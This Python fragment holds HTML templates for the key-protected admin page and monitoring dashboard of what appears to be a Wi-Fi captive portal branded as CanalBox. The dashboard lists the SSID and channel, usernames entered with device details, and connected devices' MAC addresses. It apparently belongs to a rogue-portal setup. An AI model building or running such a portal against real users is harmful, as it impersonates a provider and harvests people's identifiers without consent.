<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@600;700;800&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
<style>{_STYLE}</style>
</head><body>
{_ENTETE}
<main class="container">
  <div class="alert">
    <div class="icon-badge"><img src="/icon-warning.png" alt=""></div>
    <div>
      <span class="badge">Accès restreint</span>
      <h2>Supervision du portail CanalBox</h2>
      <p>Espace réservé au personnel technique. Saisis la clé d'accès pour consulter les appareils connectés et le journal du portail.</p>
    </div>
  </div>

  <div class="card"><div class="card-pad carte-form">
    <h2 class="titre">Clé d'accès</h2>
    <form method="post" action="/admin" autocomplete="off">
      <label class="champ" for="cle">Clé</label>
      <input id="cle" name="cle" type="password" inputmode="numeric"
             autocomplete="current-password" required autofocus placeholder="••••">
      <button type="submit" class="btn bloc">
        <img src="/icon-check.png" alt=""> Entrer
      </button>
    </form>
    {bloc}
    <div class="conseil">
      <img src="/icon-info.png" alt="">
      <div>Après 5 clés incorrectes, l'accès est bloqué pendant une minute.</div>
    </div>
  </div></div>
</main>
{_PIED}
</body></html>
"""


def page_tableau(ssid, canal, nom_page):
    return f"""<!DOCTYPE html>
<html lang="fr"><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="color-scheme" content="light">
<title>CanalBox — Supervision</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@600;700;800&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
<style>{_STYLE}</style>
</head><body>
{_ENTETE}
<main class="container">

  <div class="alert">
    <div class="icon-badge"><img src="/icon-warning.png" alt=""></div>
    <div>
      <span class="badge live" id="etat">En direct</span>
      <h2>Supervision du portail</h2>
      <p>Mise à jour automatique · dernière synchronisation <span id="maj">—</span></p>
    </div>
    <div class="droite">
      <a class="btn discret petit" href="/admin?sortie=1">Déconnexion</a>
    </div>
  </div>

  <nav class="onglets" role="tablist" aria-label="Sections du tableau de bord">
    <button class="onglet" role="tab" data-panneau="apercu" aria-selected="true">
      Vue d'ensemble
    </button>
    <button class="onglet" role="tab" data-panneau="identifications" aria-selected="false">
      Identifications <span class="pastille" id="pastille-essais">0</span>
    </button>
    <button class="onglet" role="tab" data-panneau="appareils" aria-selected="false">
      Appareils <span class="pastille" id="pastille-appareils">0</span>
    </button>
    <button class="onglet" role="tab" data-panneau="journal" aria-selected="false">
      Journal
    </button>
  </nav>

  <!-- ============ VUE D'ENSEMBLE ============ -->
  <section class="panneau actif" id="panneau-apercu" role="tabpanel">
    <div class="grille-stats">
      <div class="stat"><div class="valeur" id="st-essais">—</div><div class="libelle">Identifications</div></div>
      <div class="stat"><div class="valeur" id="st-valides">—</div><div class="libelle">Validées</div></div>
      <div class="stat"><div class="valeur" id="st-appareils">—</div><div class="libelle">Appareils</div></div>
    </div>

    <div class="card"><div class="card-pad">
      <div class="card-tete"><h2 class="titre">Portail actif</h2></div>
      <dl>
        <dt>Page servie</dt><dd>{html.escape(nom_page)}</dd>
        <dt>Nom du Wi-Fi</dt><dd>{html.escape(ssid or '—')}</dd>
        <dt>Canal</dt><dd>{html.escape(canal or '—')}</dd>
      </dl>
      <div class="conseil">
        <img src="/icon-info.png" alt="">
        <div>Le portail ne comporte aucun champ de mot de passe : seul le nom d'utilisateur
        saisi est enregistré, avec l'heure, l'appareil et la durée.</div>
      </div>
    </div></div>
  </section>

  <!-- ============ IDENTIFICATIONS ============ -->
  <section class="panneau" id="panneau-identifications" role="tabpanel">
    <div class="card"><div class="card-pad">
      <div class="card-tete">
        <h2 class="titre">Identifications <span class="compte" id="compte-essais"></span></h2>
        <div class="barre-outils" style="margin:0">
          <button class="btn danger petit" id="btn-tout-supprimer" disabled>
            <img src="/icon-check.png" alt="" style="filter:brightness(0) invert(1)"> Tout effacer
          </button>
        </div>
      </div>

      <div class="barre-outils">
        <div class="recherche">
          <input type="search" id="recherche" placeholder="Filtrer par nom, IP, appareil…" aria-label="Rechercher une identification">
        </div>
        <button class="btn discret petit" id="btn-supprimer" disabled>
          <img src="/icon-check.png" alt="" style="filter:none;opacity:0.5"> Supprimer la sélection
        </button>
      </div>

      <div class="tableau-englobe">
        <table>
          <thead><tr>
            <th style="width:38px"><input type="checkbox" id="tout-cocher" aria-label="Tout sélectionner" style="width:17px;height:17px;accent-color:#00BE80;cursor:pointer"></th>
            <th class="triable" data-tri="quand">Heure <span class="fleche">↕</span></th>
            <th class="triable" data-tri="utilisateur">Nom d'utilisateur <span class="fleche">↕</span></th>
            <th class="triable" data-tri="ip">IP <span class="fleche">↕</span></th>
            <th class="triable" data-tri="systeme">Appareil <span class="fleche">↕</span></th>
            <th class="triable" data-tri="duree">Durée <span class="fleche">↕</span></th>
            <th class="triable" data-tri="motif">Résultat <span class="fleche">↕</span></th>
          </tr></thead>
          <tbody id="essais"><tr><td colspan="7" class="vide">Chargement…</td></tr></tbody>
        </table>
      </div>
    </div></div>
  </section>

  <!-- ============ APPAREILS ============ -->
  <section class="panneau" id="panneau-appareils" role="tabpanel">
    <div class="card"><div class="card-pad">
      <div class="card-tete">
        <h2 class="titre">Appareils connectés <span class="compte" id="compte"></span></h2>
      </div>
      <div class="tableau-englobe">
        <table>
          <thead><tr>
            <th>IP</th><th>Nom annoncé</th><th>Système</th><th>Modèle</th><th>MAC</th>
          </tr></thead>
          <tbody id="corps"><tr><td colspan="5" class="vide">Chargement…</td></tr></tbody>
        </table>
      </div>
    </div></div>
  </section>

  <!-- ============ JOURNAL ============ -->
  <section class="panneau" id="panneau-journal" role="tabpanel">
    <div class="card"><div class="card-pad">
      <div class="card-tete"><h2 class="titre">Journal du portail</h2></div>
      <div class="journal-barre">
        <label class="auto-defile">
          <input type="checkbox" id="auto-defile" checked> Suivre la fin
        </label>
        <button class="btn discret petit" id="btn-copier">Copier</button>
      </div>
      <div class="journal-zone"><pre id="journal">Chargement…</pre></div>
    </div></div>
  </section>

</main>

<!-- ============ MODALES ============ -->
<div class="voile" id="voile" role="dialog" aria-modal="true" aria-labelledby="modale-titre">
  <div class="modale" id="modale">
    <div class="picto" id="modale-picto"><img src="/icon-warning.png" alt="" style="filter:brightness(0) invert(1)"></div>
    <h3 id="modale-titre">Titre</h3>
    <p id="modale-texte">Texte</p>
    <div id="modale-detail"></div>
    <div class="actions">
      <button class="btn discret" id="modale-annuler">Annuler</button>
      <button class="btn danger" id="modale-confirmer">Confirmer</button>
    </div>
  </div>
</div>

{_PIED}
<script>{_JS}</script>
</body></html>
"""
